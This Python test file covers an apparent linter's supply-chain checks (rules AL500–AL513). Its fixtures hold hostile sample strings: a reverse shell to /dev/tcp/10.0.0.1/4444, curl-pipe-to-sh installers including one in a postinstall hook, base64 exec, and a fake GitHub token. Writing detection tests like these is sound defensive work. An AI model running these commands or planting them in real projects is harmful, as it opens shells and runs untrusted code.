"""Tests for the AL5xx project-level distribution / supply-chain checks."""
from pathlib import Path


from agent_lint.project import scan_project


def codes(findings):
    return {f.rule for f in findings}


def _mkrepo(tmp_path: Path, files: dict[str, str]) -> Path:
    for rel, content in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return tmp_path


def test_al500_missing_license(tmp_path):
    repo = _mkrepo(tmp_path, {"README.md": "# x", "main.py": "print(1)"})
    assert "AL500" in codes(scan_project(repo))


def test_al500_quiet_with_license(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x"})
    assert "AL500" not in codes(scan_project(repo))


def test_al501_missing_readme(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT"})
    assert "AL501" in codes(scan_project(repo))


def test_al502_placeholder(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "see github.com/YOUR_USERNAME/x"})
    assert "AL502" in codes(scan_project(repo))


def test_al503_committed_secret(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x",
                              "config.py": 'TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"'})
    assert "AL503" in codes(scan_project(repo))


def test_al510_pipe_to_shell(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x",
                              "install.sh": "#!/bin/sh\ncurl https://x.sh | sh\n"})
    assert "AL510" in codes(scan_project(repo))


def test_al510_quiet_in_markdown(tmp_path):
    # A README *discussing* curl|sh is not malware — only code files are scanned for it.
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT",
                              "README.md": "Don't run `curl https://x.sh | sh` from untrusted sources."})
    assert "AL510" not in codes(scan_project(repo))


def test_al511_dynamic_exec(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x",
                              "loader.py": "import base64\nexec(base64.b64decode(blob))\n"})
    assert "AL511" in codes(scan_project(repo))


def test_al512_reverse_shell(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x",
                              "x.sh": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"})
    assert "AL512" in codes(scan_project(repo))


def test_al513_install_hook(tmp_path):
    repo = _mkrepo(tmp_path, {"LICENSE": "MIT", "README.md": "# x",
                              "package.json": '{"scripts": {"postinstall": "curl http://x | sh"}}'})
    assert "AL513" in codes(scan_project(repo))


def test_agentlintignore_excludes_paths(tmp_path):
    repo = _mkrepo(tmp_path, {
        "LICENSE": "MIT", "README.md": "# x",
        ".agentlintignore": "fixtures\n",
        "fixtures/bad.sh": "curl http://x | sh\n",
    })
    assert "AL510" not in codes(scan_project(repo))


def test_inline_allow_suppresses(tmp_path):
    repo = _mkrepo(tmp_path, {
        "LICENSE": "MIT", "README.md": "# x",
        "x.sh": "curl http://x | sh  # agent-lint-allow AL510\n",
    })
    assert "AL510" not in codes(scan_project(repo))


def test_clean_repo_is_clean(tmp_path):
    repo = _mkrepo(tmp_path, {
        "LICENSE": "MIT License\n", "README.md": "# project\nDoes a thing.",
        "main.py": "def run():\n    return 1\n",
    })
    assert not scan_project(repo)
